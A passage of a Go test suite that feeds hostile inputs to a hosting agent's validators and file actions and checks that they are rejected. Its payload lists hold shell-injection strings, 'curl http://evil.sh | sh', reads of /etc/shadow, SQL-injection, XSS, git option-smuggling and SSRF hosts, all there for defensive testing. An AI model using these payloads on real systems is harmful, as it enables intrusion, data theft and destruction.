package actions

// Abuse tests: every test in this file plays the attacker. A passing test
// means the attack was REJECTED. If one starts failing, a validator or an
// action lost a check and there is a vulnerability to fix (see
// docs/SEGURIDAD.md, section 2).

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/m4rtins/forja/agent/internal/osutil"
	"github.com/m4rtins/forja/agent/internal/validate"
)

// ---------------------------------------------------------------------------
// Payload catalogues
// ---------------------------------------------------------------------------

var slugAttacks = []string{
	"../etc",
	"demo/../../etc",
	"../../../etc/passwd",
	"/etc/passwd",
	"demo;rm -rf /",
	"demo`id`",
	"demo$(whoami)",
	"demo|cat /etc/passwd",
	"demo&&id",
	"demo\nroot",
	"demo\r\nX-Injected: true",
	"demo\x00",
	"DEMO",
	"-rf",
	"--help",
	"demo demo",
	"a",
	"1demo",
	"demo.evil",
	"demo/../demo",
	"",
	strings.Repeat("a", 64),
}

var hostnameAttacks = []string{
	"evil.com; rm -rf /",
	"evil.com\nX-Injected: true",
	"evil.com\r\nHost: internal",
	"evil.com\x00.good.com",
	"../../etc/passwd",
	"evil.com/../../etc/passwd",
	"evil.com/path",
	"evil.com:8080",
	"evil.com`id`",
	"evil.com$(id)",
	"evil.com|id",
	"evil.com&id",
	"evil.com\" { respond \"pwn\" }",
	"evil.com}\n:80 {",
	"*.evil.com",
	"EVIL.com",
	"evil .com",
	"-evil.com",
	"evil-.com",
	"evil..com",
	"localhost",
	"",
	strings.Repeat("a", 64) + ".com",
}

var branchAttacks = []string{
	"; rm -rf /",
	"main; rm -rf /",
	"main && id",
	"main|id",
	"main`id`",
	"main$(id)",
	"main\nINJECTED=1",
	"main\x00",
	"--upload-pack=evil",
	"-oProxyCommand=evil",
	"-x",
	"../../etc",
	"feature/../../etc",
	"main branch",
	"main:refs/heads/x",
	"main~1",
	"main^",
	"",
	strings.Repeat("a", 101),
}

var repoAttacks = []string{
	"http://github.com/user/repo",
	"git://github.com/user/repo",
	"ssh://git@github.com/user/repo",
	"git@github.com:user/repo.git",
	"file:///etc/passwd",
	"ext::sh -c id",
	"--upload-pack=evil",
	"-oProxyCommand=evil",
	"https://github.com/user/repo; rm -rf /",
	"https://github.com/user/repo\nINJECTED=1",
	"https://github.com/user/repo`id`",
	"https://github.com/user/repo$(id)",
	"https://github.com/user/repo?x=1",
	"https://github.com/user/repo#frag",
	"https://github.com/user/repo/extra",
	"https://github.com/../repo",
	"https://github.com/user/..",
	"https://user:pass@github.com/user/repo",
	"https://github.com@evil.com/user/repo",
	"https://127.0.0.1/user/repo",
	"https://10.0.0.5/user/repo",
	"https://192.168.1.1/user/repo",
	"https://169.254.169.254/user/repo",
	"https://[::1]/user/repo",
	"https://localhost/user/repo",
	"https://gitea.localhost/user/repo",
	"https://gitea.local/user/repo",
	"https://gitea.internal/user/repo",
	"https://gitea.lan/user/repo",
	// Numeric hosts that inet_aton() (used by libcurl/git) resolves to loopback.
	"https://127.1/user/repo",
	"https://0x7f.1/user/repo",
	"https://127.0.0.0x1/user/repo",
	"https://github.com:0/user/repo",
	"https://github.com:99999/user/repo",
	"",
}

var commitAttacks = []string{
	"abc1234; id",
	"abc1234\n",
	"--help",
	"HEAD",
	"main",
	"ABC1234",
	"abc123",
	"zzzzzzz",
	"../../etc",
	"abc1234`id`",
	strings.Repeat("a", 41),
	"",
}

var containerCmdAttacks = []string{
	"npm ci; rm -rf /",
	"npm ci && curl http://evil.sh | sh",
	"npm ci | sh",
	"npm ci || id",
	"npm ci & id",
	"$(id)",
	"`id`",
	"npm ci\nrm -rf /",
	"npm ci\r\nid",
	"npm ci > /etc/passwd",
	"npm ci < /etc/shadow",
	"npm 'ci'",
	`npm "ci"`,
	"npm ci # comment",
	"npm ci\\",
	"npm ci\x00",
	"npm ci ${IFS}id",
	"npm ci *",
	"npm ci (id)",
	"npm ci ~",
	strings.Repeat("a", 201),
}

var publicDirAttacks = []string{
	"../../etc",
	"public/../../etc",
	"/etc",
	"..",
	"public; id",
	"public\nid",
	"public`id`",
	"public$(id)",
	"-rf",
	"pub lic",
	"public\x00",
}

var containerNameAttacks = []string{
	"fj-demo; podman rm -af",
	"fj-demo\nid",
	"fj-demo`id`",
	"fj-demo$(id)",
	"fj-demo|id",
	"fj-demo&&id",
	"--privileged",
	"-v /:/host",
	"../../etc",
	"fj demo",
	"FJ-DEMO",
	"fj-demo/../../x",
	"fj-demo\x00",
	"/var/run/docker.sock",
	"ab",
}

var envKeyAttacks = []string{
	"KEY=val\nINJECTED=true",
	"KEY\nINJECTED",
	"KEY=val",
	"KEY VAL",
	"KEY;id",
	"KEY$(id)",
	"KEY`id`",
	"KEY\x00",
	"1KEY",
	"KEY-NAME",
	"KEY.NAME",
	"",
	strings.Repeat("A", 129),
}

var envValueAttacks = []string{
	"val\nINJECTED=true",
	"val\r\nINJECTED=true",
	"val\rINJECTED=true",
	"val\x00",
	strings.Repeat("a", 8193),
}

var dbIdentAttacks = []string{
	"db'; DROP DATABASE mysql; --",
	"db\"; DROP TABLE users; --",
	"db`; DROP DATABASE x; `",
	"db; id",
	"db\nid",
	"db$(id)",
	"db name",
	"db-name",
	"db.name",
	"../etc",
	"DB_UPPER",
	"1db",
	"db\x00",
	"",
	"a",
	strings.Repeat("a", 42),
}

var dbPasswordAttacks = []string{
	"abc'; DROP USER root; --",
	"abc123ef\nINJECTED",
	"abc123ef$(id)",
	"abc123ef`id`",
	"abc123ef\"",
	"abc123ef'",
	"short",
	"not-hex-zzzzzzzz",
	"abc123ef\x00",
	strings.Repeat("a", 129),
	"",
}

var modeAttacks = []string{
	"online; id",
	"ONLINE",
	"maintenance\n",
	"../disabled",
	"",
	"admin",
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func with(base map[string]any, key string, value any) map[string]any {
	out := make(map[string]any, len(base)+1)
	for k, v := range base {
		out[k] = v
	}
	out[key] = value
	return out
}

func mustJSON(t *testing.T, v any) json.RawMessage {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal params: %v", err)
	}
	return b
}

// requireRejected asserts that Validate refuses the params with a typed
// validation error (not just any error), so a typo in the baseline cannot
// make the test pass for the wrong reason.
func requireRejected(t *testing.T, a Action, params map[string]any) {
	t.Helper()
	err := a.Validate(mustJSON(t, params))
	if err == nil {
		t.Fatalf("%s accepted hostile params: %v", a.Name(), params)
	}
	if !errors.Is(err, validate.ErrInvalid) {
		t.Fatalf("%s rejected hostile params with an untyped error: %v", a.Name(), err)
	}
}

func requireAccepted(t *testing.T, a Action, params map[string]any) {
	t.Helper()
	if err := a.Validate(mustJSON(t, params)); err != nil {
		t.Fatalf("%s rejected the benign baseline %v: %v", a.Name(), params, err)
	}
}

// escapingCalls returns every recorded argument that mentions needle but does
// not live under allowedPrefix.
func escapingArgs(fake *osutil.FakeExecutor, needle, allowedPrefix string) []string {
	var bad []string
	for _, c := range fake.Calls {
		for _, arg := range c.Args {
			if strings.Contains(arg, needle) && !strings.HasPrefix(arg, allowedPrefix) {
				bad = append(bad, c.Method+" "+arg)
			}
		}
	}
	return bad
}

// privilegedCalls counts calls that would change or read the system.
func privilegedCalls(fake *osutil.FakeExecutor) int {
	n := 0
	for _, c := range fake.Calls {
		switch c.Method {
		case "Run", "RunAs", "WriteFile", "WriteFileAtomic", "MkdirAll", "Chown", "EnsureDir":
			n++
		}
	}
	return n
}

// abuseHome creates a real account home on disk (so SafePath can resolve it)
// and returns the base dir and the symlink-resolved home dir.
func abuseHome(t *testing.T) (base, home string) {
	t.Helper()
	base = t.TempDir()
	home = filepath.Join(base, "demo")
	if err := os.MkdirAll(home, 0o755); err != nil {
		t.Fatal(err)
	}
	resolved, err := filepath.EvalSymlinks(home)
	if err != nil {
		t.Fatal(err)
	}
	return base, resolved
}

// ---------------------------------------------------------------------------
// Validate-level matrix: hostile value in every field that reaches a path,
// an argument or a config file.
// ---------------------------------------------------------------------------

var baseDeploy = map[string]any{
	"account_slug":    "demo",
	"domain":          "example.com",
	"runtime":         "node",
	"runtime_version": "22",
	"repo":            "https://github.com/user/repo",
	"branch":          "main",
	"commit":          "abc1234",
	"install_cmd":     "npm ci",
	"build_cmd":       "npm run build",
	"start_cmd":       "npm start",
	"public_dir":      "public",
	"target_port":     10000,
	"old_container":   "fj-demo-example-com-green",
	"cpu_millis":      1000,
	"memory_mb":       512,
	"env_vars":        map[string]string{"API_KEY": "value"},
}

type abuseMatrixCase struct {
	action Action
	base   map[string]any
	fields map[string][]string
}

func abuseMatrix() []abuseMatrixCase {
	fake := osutil.NewFakeExecutor()
	slug := map[string][]string{"account_slug": slugAttacks}
	merge := func(ms ...map[string][]string) map[string][]string {
		out := map[string][]string{}
		for _, m := range ms {
			for k, v := range m {
				out[k] = v
			}
		}
		return out
	}
	files := map[string]any{"account_slug": "demo", "path": "index.js"}
	db := map[string]any{
		"account_slug": "demo", "engine": "postgres", "db_name": "appdb",
		"db_user": "appuser", "db_password": "abcdef0123456789",
	}
	return []abuseMatrixCase{
		{&AccountCreate{OS: fake}, map[string]any{"slug": "demo", "cpu_millis": 1000, "memory_mb": 512, "disk_mb": 1000},
			map[string][]string{"slug": slugAttacks}},
		{&SiteCreate{OS: fake}, map[string]any{"account_slug": "demo", "domain": "example.com", "runtime": "node", "runtime_version": "22", "internal_port": 10000},
			merge(slug, map[string][]string{"domain": hostnameAttacks, "runtime_version": {"22; id", "latest", "$(id)", "../22", "22\n"}})},
		{&SiteDeploy{OS: fake}, baseDeploy,
			merge(slug, map[string][]string{
				"domain":          hostnameAttacks,
				"repo":            repoAttacks,
				"branch":          branchAttacks,
				"commit":          commitAttacks,
				"install_cmd":     containerCmdAttacks,
				"build_cmd":       containerCmdAttacks,
				"start_cmd":       containerCmdAttacks,
				"public_dir":      publicDirAttacks,
				"old_container":   containerNameAttacks,
				"runtime_version": {"22; id", "latest", "$(id)", "../22", "22\n", "22 --privileged"},
			})},
		{&SiteSetMode{OS: fake}, map[string]any{"account_slug": "demo", "domain": "example.com", "mode": "online"},
			merge(slug, map[string][]string{"domain": hostnameAttacks, "mode": modeAttacks})},
		{&LogsTail{OS: fake}, map[string]any{"account_slug": "demo", "domain": "example.com", "source": "app", "lines": 10},
			merge(slug, map[string][]string{"domain": hostnameAttacks, "source": {"app; id", "../app", "APP", "", "all", "app\n"}})},
		{&FilesList{OS: fake}, files, slug},
		{&FilesRead{OS: fake}, files, slug},
		{&FilesWrite{OS: fake}, with(files, "content", "x"), slug},
		{&FilesUpload{OS: fake}, with(files, "content_base64", "eA=="), slug},
		{&FilesDelete{OS: fake}, files, slug},
		{&FilesMkdir{OS: fake}, files, slug},
		{&DBCreate{OS: fake}, db,
			merge(slug, map[string][]string{
				"db_name": dbIdentAttacks, "db_user": dbIdentAttacks, "db_password": dbPasswordAttacks,
				"engine": {"postgres; id", "sqlite", "MariaDB", "", "../mysql"},
			})},
		{&DBDrop{OS: fake}, map[string]any{"account_slug": "demo", "engine": "postgres", "db_name": "appdb", "db_user": "appuser", "remaining_dbs": 1},
			merge(slug, map[string][]string{"db_name": dbIdentAttacks, "db_user": dbIdentAttacks})},
		{&DBDump{OS: fake}, db,
			merge(slug, map[string][]string{"db_name": dbIdentAttacks, "db_user": dbIdentAttacks, "db_password": dbPasswordAttacks})},
		{&DBSetPassword{OS: fake}, map[string]any{"account_slug": "demo", "engine": "postgres", "db_user": "appuser", "new_password": "abcdef0123456789"},
			merge(slug, map[string][]string{"db_user": dbIdentAttacks, "new_password": dbPasswordAttacks})},
		{&DBToolStart{OS: fake}, map[string]any{"account_slug": "demo", "tool": "adminer", "engine": "postgres", "db_host": "fj-demo-db"},
			merge(slug, map[string][]string{"db_host": containerNameAttacks, "tool": {"adminer; id", "bash", "../adminer", ""}})},
		{&DBToolStop{OS: fake}, map[string]any{"account_slug": "demo", "tool": "adminer"},
			merge(slug, map[string][]string{"tool": {"adminer; id", "bash", "../adminer", ""}})},
		{&BackupRun{OS: fake}, map[string]any{"account_slug": "demo", "scope": "all"},
			merge(slug, map[string][]string{"scope": {"all; id", "everything", "ALL", "../all", ""}})},
		{&BackupRestore{OS: fake}, map[string]any{"account_slug": "demo", "restic_snapshot_id": "abcdef0123", "target": "all", "confirm": true},
			merge(slug, map[string][]string{
				"restic_snapshot_id": {"abcdef0123; id", "--help", "latest", "../abcdef01", "abcdef0123\n", "short", ""},
				"target":             {"site:../../etc", "site:evil.com; id", "site:", "everything", "all\n", "site:-evil", ""},
			})},
		{&BackupExport{OS: fake}, map[string]any{"account_slug": "demo", "site_domain": "example.com"},
			merge(slug, map[string][]string{"site_domain": hostnameAttacks[:len(hostnameAttacks)-3]})},
		{&CertStatus{OS: fake}, map[string]any{"account_slug": "demo", "domain": "example.com"},
			merge(slug, map[string][]string{"domain": hostnameAttacks})},
		{&CFRoutesSync{}, map[string]any{
			"connection_id": 1, "cf_account_id": strings.Repeat("a", 32),
			"tunnel_id": "11111111-2222-3333-4444-555555555555", "api_token": strings.Repeat("a", 40),
			"domains": []string{"example.com"}},
			map[string][]string{
				"cf_account_id": {"../../x", strings.Repeat("a", 31), "zz" + strings.Repeat("a", 30), "a; id", ""},
				"tunnel_id":     {"../../x", "11111111-2222-3333-4444-55555555555; id", "not-a-uuid", "11111111-2222-3333-4444-555555555555\n", ""},
				"api_token":     {"tok; id", "tok\n" + strings.Repeat("a", 30), "short", ""},
			}},
	}
}

func TestAbuse_BaselinesAreValid(t *testing.T) {
	// Guards the matrix: if a baseline were invalid, every "rejected" below
	// could pass for the wrong reason.
	for _, c := range abuseMatrix() {
		requireAccepted(t, c.action, c.base)
	}
}

func TestAbuse_HostileValueInAnyFieldIsRejected(t *testing.T) {
	for _, c := range abuseMatrix() {
		for field, payloads := range c.fields {
			for _, payload := range payloads {
				name := fmt.Sprintf("%s/%s/%q", c.action.Name(), field, payload)
				t.Run(name, func(t *testing.T) {
					requireRejected(t, c.action, with(c.base, field, payload))
				})
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Environment variables: key/value injection into the .env file
// ---------------------------------------------------------------------------

func TestAbuse_EnvVarKeyInjectionIsRejected(t *testing.T) {
	a := &SiteDeploy{OS: osutil.NewFakeExecutor()}
	for _, key := range envKeyAttacks {
		t.Run(fmt.Sprintf("key=%q", key), func(t *testing.T) {
			requireRejected(t, a, with(baseDeploy, "env_vars", map[string]string{key: "value"}))
		})
	}
}

func TestAbuse_EnvVarValueNewlineInjectionIsRejected(t *testing.T) {
	a := &SiteDeploy{OS: osutil.NewFakeExecutor()}
	for _, val := range envValueAttacks {
		t.Run(fmt.Sprintf("value=%.20q", val), func(t *testing.T) {
			requireRejected(t, a, with(baseDeploy, "env_vars", map[string]string{"API_KEY": val}))
		})
	}
}

func TestAbuse_EnvVarKeyValueSmugglingNeverReachesEnvFile(t *testing.T) {
	// "KEY=val\nINJECTED=true" is rejected both as key and as value, so the
	// generated env file can never contain a line the user did not declare.
	vars := map[string]string{"SAFE": "value$(id)`id`;rm -rf /"} // shell syntax in a VALUE is inert data
	content := buildEnvFile("node", 10000, vars)
	for _, line := range strings.Split(strings.TrimRight(content, "\n"), "\n") {
		if !strings.Contains(line, "=") {
			t.Errorf("env file line without KEY=VALUE shape: %q", line)
		}
		if strings.HasPrefix(line, "INJECTED") {
			t.Errorf("injected variable present: %q", line)
		}
	}
}

// ---------------------------------------------------------------------------
// Caddy config injection and notice pages (stored XSS)
// ---------------------------------------------------------------------------

func TestAbuse_CaddySyncRejectsInjectedDomainsAndSlugs(t *testing.T) {
	a := &CaddySync{OS: osutil.NewFakeExecutor()}
	site := func(domain, slug, mode string) map[string]any {
		return map[string]any{
			"panel_port": 7000,
			"sites": []map[string]any{{
				"domains": []string{domain}, "mode": mode, "internal_port": 10000, "account_slug": slug,
			}},
		}
	}
	requireAccepted(t, a, site("example.com", "demo", "online"))

	for _, d := range hostnameAttacks {
		t.Run(fmt.Sprintf("domain=%q", d), func(t *testing.T) {
			requireRejected(t, a, site(d, "demo", "online"))
		})
	}
	for _, s := range slugAttacks {
		t.Run(fmt.Sprintf("slug=%q", s), func(t *testing.T) {
			requireRejected(t, a, site("example.com", s, "online"))
		})
	}
	for _, m := range modeAttacks {
		t.Run(fmt.Sprintf("mode=%q", m), func(t *testing.T) {
			requireRejected(t, a, site("example.com", "demo", m))
		})
	}
}

func TestAbuse_NoticePagesEscapeScriptsAndCaddyPlaceholders(t *testing.T) {
	payloads := []string{
		`<script>alert(1)</script>`,
		`"><img src=x onerror=alert(1)>`,
		`</title><script>alert(1)</script>`,
		`{http.request.header.Authorization}`,
		`{env.CF_API_TOKEN}`,
		`{file./etc/passwd}`,
		`<style>@import url(//evil)</style>`,
	}
	pages := map[string]func(string, string) string{
		"maintenance": maintenancePage,
		"disabled":    disabledPage,
	}
	for name, render := range pages {
		for _, p := range payloads {
			t.Run(fmt.Sprintf("%s/%q", name, p), func(t *testing.T) {
				for _, out := range []string{render(p, "msg"), render("title", p)} {
					if strings.Contains(out, "<script") || strings.Contains(out, "<img") || strings.Contains(out, "<style>@import") {
						t.Errorf("unescaped markup in notice page: %q", out)
					}
					for _, ph := range []string{"{http.", "{env.", "{file."} {
						if strings.Contains(out, ph) {
							t.Errorf("Caddy placeholder %q survives in notice page (runtime expansion): %q", ph, out)
						}
					}
				}
			})
		}
	}
}

// ---------------------------------------------------------------------------
// Path traversal at Execute level (real temp dirs, FakeExecutor for commands)
// ---------------------------------------------------------------------------

var traversalPaths = []string{
	"../../etc/passwd",
	"../../../../../../../../etc/shadow",
	"../demo-evil/secret",
	"../demo/../../etc/passwd",
	"sites/../../../etc/passwd",
	"./../../etc/passwd",
	"a/b/../../../../etc/passwd",
	"..",
	"../",
	"../..",
	"..\x00/etc/passwd",
	"index.js\x00../../etc/passwd",
	"\x00",
	"/etc/passwd/../../../etc/shadow",
}

func TestAbuse_FilesActionsCannotLeaveTheAccountHome(t *testing.T) {
	type op struct {
		name string
		run  func(base string, fake *osutil.FakeExecutor, path string) error
	}
	ops := []op{
		{"files.list", func(base string, f *osutil.FakeExecutor, p string) error {
			_, err := (&FilesList{OS: f, BasePath: base}).Execute(context.Background(),
				mustJSON(t, map[string]any{"account_slug": "demo", "path": p}))
			return err
		}},
		{"files.read", func(base string, f *osutil.FakeExecutor, p string) error {
			_, err := (&FilesRead{OS: f, BasePath: base}).Execute(context.Background(),
				mustJSON(t, map[string]any{"account_slug": "demo", "path": p}))
			return err
		}},
		{"files.write", func(base string, f *osutil.FakeExecutor, p string) error {
			_, err := (&FilesWrite{OS: f, BasePath: base}).Execute(context.Background(),
				mustJSON(t, map[string]any{"account_slug": "demo", "path": p, "content": "pwn"}))
			return err
		}},
		{"files.upload", func(base string, f *osutil.FakeExecutor, p string) error {
			_, err := (&FilesUpload{OS: f, BasePath: base}).Execute(context.Background(),
				mustJSON(t, map[string]any{"account_slug": "demo", "path": p, "content_base64": "cHdu"}))
			return err
		}},
		{"files.delete", func(base string, f *osutil.FakeExecutor, p string) error {
			_, err := (&FilesDelete{OS: f, BasePath: base}).Execute(context.Background(),
				mustJSON(t, map[string]any{"account_slug": "demo", "path": p, "recursive": true}))
			return err
		}},
		{"files.mkdir", func(base string, f *osutil.FakeExecutor, p string) error {
			_, err := (&FilesMkdir{OS: f, BasePath: base}).Execute(context.Background(),
				mustJSON(t, map[string]any{"account_slug": "demo", "path": p}))
			return err
		}},
	}

	for _, o := range ops {
		for _, p := range traversalPaths {
			t.Run(fmt.Sprintf("%s/%q", o.name, p), func(t *testing.T) {
				base, _ := abuseHome(t)
				// A sibling account whose name shares the prefix: HasPrefix-only
				// checks would let "../demo-evil" through.
				if err := os.MkdirAll(filepath.Join(base, "demo-evil"), 0o755); err != nil {
					t.Fatal(err)
				}
				fake := osutil.NewFakeExecutor()
				fake.LookupResult["fj-demo"] = [2]int{1001, 1001}

				err := o.run(base, fake, p)
				if err == nil {
					t.Fatalf("%s accepted traversal path %q", o.name, p)
				}
				if n := privilegedCalls(fake); n != 0 {
					t.Fatalf("%s rejected %q only after %d privileged calls: %v", o.name, p, n, fake.Calls)
				}
			})
		}
	}
}

func TestAbuse_AbsolutePathIsReRootedInsideTheHome(t *testing.T) {
	base, home := abuseHome(t)
	if err := os.MkdirAll(filepath.Join(home, "etc"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, "etc", "shadow"), []byte("decoy"), 0o644); err != nil {
		t.Fatal(err)
	}

	fake := osutil.NewFakeExecutor()
	fake.RunAsFunc = func(_ context.Context, _ string, name string, args ...string) ([]byte, error) {
		if name == "/usr/bin/stat" {
			return []byte("5\n"), nil
		}
		return []byte("decoy"), nil
	}
	a := &FilesRead{OS: fake, BasePath: base}
	if _, err := a.Execute(context.Background(), mustJSON(t, map[string]any{"account_slug": "demo", "path": "/etc/shadow"})); err != nil {
		t.Fatalf("expected the absolute path to be confined (not failed): %v", err)
	}
	if bad := escapingArgs(fake, "shadow", home); len(bad) != 0 {
		t.Fatalf("/etc/shadow was read outside the account home: %v", bad)
	}
}

func TestAbuse_AbsolutePathWithoutDecoyIsRejected(t *testing.T) {
	base, _ := abuseHome(t)
	for _, p := range []string{"/etc/shadow", "/etc/passwd", "/root/.ssh/id_rsa", "/proc/self/environ", "/srv/forja/accounts/other/secret"} {
		t.Run(p, func(t *testing.T) {
			fake := osutil.NewFakeExecutor()
			a := &FilesRead{OS: fake, BasePath: base}
			if _, err := a.Execute(context.Background(), mustJSON(t, map[string]any{"account_slug": "demo", "path": p})); err == nil {
				t.Fatalf("read of %s succeeded", p)
			}
			if n := privilegedCalls(fake); n != 0 {
				t.Fatalf("privileged calls made for %s: %v", p, fake.Calls)
			}
		})
	}
}

func TestAbuse_SymlinkPlantedInHomeCannotPointOutside(t *testing.T) {
	base, home := abuseHome(t)
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "secret"), []byte("top secret"), 0o600); err != nil {
		t.Fatal(err)
	}
	// What a compromised web app can do: plant links in its own home.
	if err := os.Symlink(outside, filepath.Join(home, "dirlink")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "secret"), filepath.Join(home, "filelink")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/etc", filepath.Join(home, "etclink")); err != nil {
		t.Fatal(err)
	}
	// Relative chain that climbs out.
	if err := os.Symlink("../../../../../../etc", filepath.Join(home, "climb")); err != nil {
		t.Fatal(err)
	}

	paths := []string{"dirlink", "dirlink/secret", "filelink", "etclink/passwd", "etclink", "climb/passwd", "climb"}
	for _, p := range paths {
		t.Run("read/"+p, func(t *testing.T) {
			fake := osutil.NewFakeExecutor()
			_, err := (&FilesRead{OS: fake, BasePath: base}).Execute(context.Background(),
				mustJSON(t, map[string]any{"account_slug": "demo", "path": p}))
			if err == nil || privilegedCalls(fake) != 0 {
				t.Fatalf("symlink %q followed out of the home (err=%v calls=%v)", p, err, fake.Calls)
			}
		})
		t.Run("list/"+p, func(t *testing.T) {
			fake := osutil.NewFakeExecutor()
			_, err := (&FilesList{OS: fake, BasePath: base}).Execute(context.Background(),
				mustJSON(t, map[string]any{"account_slug": "demo", "path": p}))
			if err == nil || privilegedCalls(fake) != 0 {
				t.Fatalf("symlink %q listed outside the home (err=%v calls=%v)", p, err, fake.Calls)
			}
		})
		t.Run("delete/"+p, func(t *testing.T) {
			fake := osutil.NewFakeExecutor()
			_, err := (&FilesDelete{OS: fake, BasePath: base}).Execute(context.Background(),
				mustJSON(t, map[string]any{"account_slug": "demo", "path": p, "recursive": true}))
			if err == nil || privilegedCalls(fake) != 0 {
				t.Fatalf("symlink %q deleted outside the home (err=%v calls=%v)", p, err, fake.Calls)
			}
		})
	}
}

func TestAbuse_WriteThroughDanglingSymlinkStaysInsideHome(t *testing.T) {
	base, home := abuseHome(t)
	target := filepath.Join(t.TempDir(), "does-not-exist-yet")
	if err := os.Symlink(target, filepath.Join(home, "dangling")); err != nil {
		t.Fatal(err)
	}

	fake := osutil.NewFakeExecutor()
	fake.LookupResult["fj-demo"] = [2]int{1001, 1001}
	a := &FilesWrite{OS: fake, BasePath: base}
	_, _ = a.Execute(context.Background(), mustJSON(t, map[string]any{"account_slug": "demo", "path": "dangling", "content": "pwn"}))

	for _, c := range fake.Calls {
		if c.Method == "WriteFileAtomic" || c.Method == "WriteFile" {
			if !strings.HasPrefix(c.Args[0], home+string(filepath.Separator)) {
				t.Fatalf("write landed outside the home: %v", c)
			}
			if c.Args[0] == target {
				t.Fatalf("write followed the dangling symlink to %s", target)
			}
		}
	}
	if _, err := os.Stat(target); err == nil {
		t.Fatalf("symlink target %s was created", target)
	}
}

func TestAbuse_UploadWithMaliciousFilenameCannotEscape(t *testing.T) {
	names := []string{
		"../../etc/crontab",
		"../../../etc/cron.d/pwn",
		"uploads/../../../etc/crontab",
		"/etc/crontab",
		"/etc/cron.d/pwn",
		"..",
		"uploads/../../demo-evil/x.php",
		"../../root/.ssh/authorized_keys",
		"x\x00.php/../../../../etc/crontab",
	}
	for _, n := range names {
		t.Run(fmt.Sprintf("%q", n), func(t *testing.T) {
			base, home := abuseHome(t)
			if err := os.MkdirAll(filepath.Join(base, "demo-evil"), 0o755); err != nil {
				t.Fatal(err)
			}
			fake := osutil.NewFakeExecutor()
			fake.LookupResult["fj-demo"] = [2]int{1001, 1001}
			a := &FilesUpload{OS: fake, BasePath: base}
			_, _ = a.Execute(context.Background(), mustJSON(t, map[string]any{
				"account_slug": "demo", "path": n, "content_base64": "KiAqICogKiAqICogcm9vdCBpZAo=",
			}))
			for _, c := range fake.Calls {
				switch c.Method {
				case "WriteFileAtomic", "WriteFile":
					if !strings.HasPrefix(c.Args[0], home+string(filepath.Separator)) {
						t.Fatalf("upload %q wrote to %s", n, c.Args[0])
					}
				case "RunAs":
					// mkdir -p <parent>: the parent must also be inside the home.
					for _, arg := range c.Args {
						if strings.HasPrefix(arg, "/") && !strings.HasPrefix(arg, "/usr/bin/") &&
							arg != home && !strings.HasPrefix(arg, home+string(filepath.Separator)) {
							t.Fatalf("upload %q ran %v outside the home", n, c)
						}
					}
				}
			}
		})
	}
}

func TestAbuse_DeleteRefusesTheHomeItself(t *testing.T) {
	for _, p := range []string{".", "./", "sites/..", "a/b/../..", "/"} {
		t.Run(fmt.Sprintf("%q", p), func(t *testing.T) {
			base, _ := abuseHome(t)
			fake := osutil.NewFakeExecutor()
			_, err := (&FilesDelete{OS: fake, BasePath: base}).Execute(context.Background(),
				mustJSON(t, map[string]any{"account_slug": "demo", "path": p, "recursive": true}))
			if err == nil {
				t.Fatalf("recursive delete of the account home via %q was accepted", p)
			}
			if len(fake.CallsFor("RunAs")) != 0 {
				t.Fatalf("rm was invoked: %v", fake.Calls)
			}
		})
	}
}

func TestAbuse_FilenamesStartingWithDashAreNotParsedAsOptions(t *testing.T) {
	// Resolved paths are absolute, so "-rf" or "--help" can never be read by
	// rm/cat/find as an option. The delete call additionally uses "--".
	base, home := abuseHome(t)
	for _, name := range []string{"-rf", "--no-preserve-root", "-"} {
		if err := os.WriteFile(filepath.Join(home, name), []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
		fake := osutil.NewFakeExecutor()
		if _, err := (&FilesDelete{OS: fake, BasePath: base}).Execute(context.Background(),
			mustJSON(t, map[string]any{"account_slug": "demo", "path": name, "recursive": true})); err != nil {
			t.Fatalf("delete %q: %v", name, err)
		}
		calls := fake.CallsFor("RunAs")
		if len(calls) != 1 {
			t.Fatalf("expected one rm call, got %v", calls)
		}
		args := calls[0].Args // username, binary, args...
		last := args[len(args)-1]
		if !strings.HasPrefix(last, "/") {
			t.Errorf("%q reached rm as a non-absolute argument %q", name, last)
		}
		dashdash := false
		for _, a := range args {
			if a == "--" {
				dashdash = true
			}
		}
		if !dashdash {
			t.Errorf("rm for %q has no -- separator: %v", name, args)
		}
	}
}

// ---------------------------------------------------------------------------
// Log paths
// ---------------------------------------------------------------------------

func TestAbuse_BuildLogPathTraversalIsRejected(t *testing.T) {
	logPaths := []string{
		"../../../../../../etc/passwd",
		"../../app/.env",
		"../.env",
		"/etc/shadow",
		"/srv/forja/accounts/other/sites/example.com/logs/build.log",
		"..",
		"logs/../../../../etc/passwd",
		"build.log\x00../../../../etc/passwd",
		"\x00",
	}
	for _, lp := range logPaths {
		t.Run(fmt.Sprintf("%q", lp), func(t *testing.T) {
			base, home := abuseHome(t)
			logsDir := filepath.Join(home, "sites", "example.com", "logs")
			if err := os.MkdirAll(logsDir, 0o755); err != nil {
				t.Fatal(err)
			}
			fake := osutil.NewFakeExecutor()
			fake.RunAsFunc = func(_ context.Context, _ string, _ string, _ ...string) ([]byte, error) {
				return []byte("line\n"), nil
			}
			a := &LogsTail{OS: fake, BasePath: base}
			_, _ = a.Execute(context.Background(), mustJSON(t, map[string]any{
				"account_slug": "demo", "domain": "example.com", "source": "build", "lines": 10, "log_path": lp,
			}))
			for _, c := range fake.CallsFor("RunAs") {
				for _, arg := range c.Args {
					if strings.HasPrefix(arg, "/") && !strings.HasPrefix(arg, "/usr/bin/") &&
						!strings.HasPrefix(arg, logsDir+string(filepath.Separator)) {
						t.Fatalf("build log path %q made the agent read %q (outside %s)", lp, arg, logsDir)
					}
				}
			}
		})
	}
}

func TestAbuse_BuildLogSymlinkToSecretIsRejected(t *testing.T) {
	base, home := abuseHome(t)
	logsDir := filepath.Join(home, "sites", "example.com", "logs")
	if err := os.MkdirAll(logsDir, 0o755); err != nil {
		t.Fatal(err)
	}
	secret := filepath.Join(t.TempDir(), "shadow")
	if err := os.WriteFile(secret, []byte("root:$6$hash"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(secret, filepath.Join(logsDir, "build.log")); err != nil {
